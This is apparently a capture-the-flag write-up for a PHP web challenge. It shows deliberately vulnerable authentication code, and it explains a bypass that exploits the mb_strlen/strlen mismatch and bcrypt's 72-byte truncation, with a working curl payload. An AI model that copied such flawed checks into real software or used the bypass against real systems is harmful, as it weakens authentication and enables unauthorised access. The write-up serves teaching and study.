# Baby Web 1

## Task

Someone wrote the perfect authentication system but its only weakness is that
the previous password must be stored in the file.

Url: http://smerdis.razictf.ir/babyweb1/

Tags: Web security

## Solution

On the website we are given this source code:

```php  
<?php
$prev_pass = "66842480683974257935677681585401189190148531340690145540123461534603155084209704";
if ( isset($_GET["password"])) {
    if ( mb_strlen($_GET["password"], 'utf8') < strlen($prev_pass)){
        if ( strlen($_GET["password"]) > mb_strlen($prev_pass, "utf8")){
            $input_h = password_hash($_GET["password"], PASSWORD_BCRYPT);
            if ( password_verify($prev_pass, $input_h)){
                echo exec("cat flag.txt");
                die();
            } else {
                echo "Are you trying to hack me?!";
                die();
            }
        } else {
            echo "Nope";
            die();
        }
    } else {
        echo ":/";
        die();
    }
} else {
    highlight_file(__FILE__);
    die();
}
?>
```

We need to provide GET parameter password. It has to pass two length checks.
`mb_strlen` returns the amount of multibyte characters where as `strlen`
returns the amount of bytes.

https://www.php.net/manual/en/function.strlen.php `Note: strlen() returns the
number of bytes rather than the number of characters in a string.`

If we replace three charactes with two multibyte characters our multibyte
strlen is less than the original strlen (-3 + 2 = -1). Our strlen is also
greater than the multibyte strlen of the original pass (-3 + 4 = +1).

Let's see if that works and we get `Are you trying to hack me?!`:

```bash  
$ curl
"http://smerdis.razictf.ir/babyweb1/?password=66842480683974257935677681585401189190148531340690145540123461534603155084209$(printf
'\u1337\u1337')"  
RaziCTF{w3ll_d0nE_go_0n_to_THE_n3xT_OnE}  
```

Wait, what? How did I pass the `password_verify` check?

After debugging it locally and reducing the input one char at a time
`password_verify` returns 1 as long as the input length is greater or equal
than 72. Turns out this is also documented on
https://www.php.net/manual/en/function.password-hash.php

`Caution Using the PASSWORD_BCRYPT as the algorithm, will result in the
password parameter being truncated to a maximum length of 72 characters.`  

Original writeup (https://github.com/klassiker/ctf-
writeups/blob/master/2020/razictf/baby-web-1.md).